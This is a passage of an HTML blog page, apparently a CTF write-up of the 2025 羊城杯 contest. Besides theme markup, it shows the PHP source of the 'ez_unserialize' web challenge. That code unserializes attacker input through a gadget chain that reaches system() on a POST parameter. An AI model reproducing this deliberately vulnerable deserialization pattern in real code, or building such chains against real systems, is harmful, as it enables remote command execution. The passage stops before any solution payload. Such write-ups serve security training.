@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2025/10/14/2025羊城杯wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="吐槽一句，现在的线上赛真的是一言难尽，可能是大家都太厉害了，个个都是网络安全人才。。。也可能是我太菜了。。。 可能是因为看到我们好不容易做出来一题，排名刚上去那么一点，还没来得及庆幸，不出20分钟又掉回去了，心态可能受到了一点影响，导致后面新上的题没什么心思做了 WEB不得不说这次比赛的WEB是真的喜欢出SSTI。。。Nodejs、Java、python的模板渲染全考了 ez_unserializ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025羊城杯 WP">
+<meta property="og:url" content="http://laijunyue.github.io/2025/10/14/2025%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="吐槽一句，现在的线上赛真的是一言难尽，可能是大家都太厉害了，个个都是网络安全人才。。。也可能是我太菜了。。。 可能是因为看到我们好不容易做出来一题，排名刚上去那么一点，还没来得及庆幸，不出20分钟又掉回去了，心态可能受到了一点影响，导致后面新上的题没什么心思做了 WEB不得不说这次比赛的WEB是真的喜欢出SSTI。。。Nodejs、Java、python的模板渲染全考了 ez_unserializ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251011124713538.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011153353048.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011153412121.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011153501285.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011153620342.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011175116954.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011175212815.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011175224047.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251011181540354.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251012155803930.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251012160148723.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251012160702978.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251012161712264.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251012161730366.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251012110618902.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251017182151180.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251017182245331.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015165547351.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251011215150455.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011225927264.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251011225941061.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015153924845.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015154656610.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015154617470.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015161051765.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015161311863.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015162156960.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015162104815.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015162549339.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251011215843157.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251017175915690.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251011230112231.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015090746881.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015091533849.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015091900571.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015092122119.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015124546396.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251015124704765.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015124953825.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251015125931627.png">
+<meta property="article:published_time" content="2025-10-14T11:07:05.000Z">
+<meta property="article:modified_time" content="2025-10-20T01:19:53.000Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laijunyue.github.io/2025/10/14/images/image-20251011124713538.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/background.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/background.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/background.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2025羊城杯 WP -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">29</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">2025羊城杯 WP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/xiaolai.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-14 19:07:05</span>
+        <span class="mobile">2025-10-14 19:07:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-20 09:19:53</span>
+            <span class="mobile">2025-10-20 09:19:53</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>吐槽一句，现在的线上赛真的是一言难尽，可能是大家都太厉害了，个个都是网络安全人才。。。也可能是我太菜了。。。</p>
+<p>可能是因为看到我们好不容易做出来一题，排名刚上去那么一点，还没来得及庆幸，不出20分钟又掉回去了，心态可能受到了一点影响，导致后面新上的题没什么心思做了</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><strong>不得不说这次比赛的WEB是真的喜欢出SSTI。。。Nodejs、Java、python的模板渲染全考了</strong></p>
+<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>源码</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;first = <span class="string">&quot;继续加油！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;secret&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot; maybe is here!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;found-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/U/&quot;</span>,<span class="variable">$this</span>-&gt;finalstep)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仔细想想！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;step = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">finalstep</span>();</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;step)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;you = <span class="string">&quot;nobody&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;who-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$func_name</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func_name</span>,<span class="variable">$args</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;there = <span class="keyword">new</span> <span class="title function_ invoke__">N</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;there-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$abc</span> = <span class="variable language_">$this</span>-&gt;dowhat;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go-&gt;<span class="variable">$abc</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;Win!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
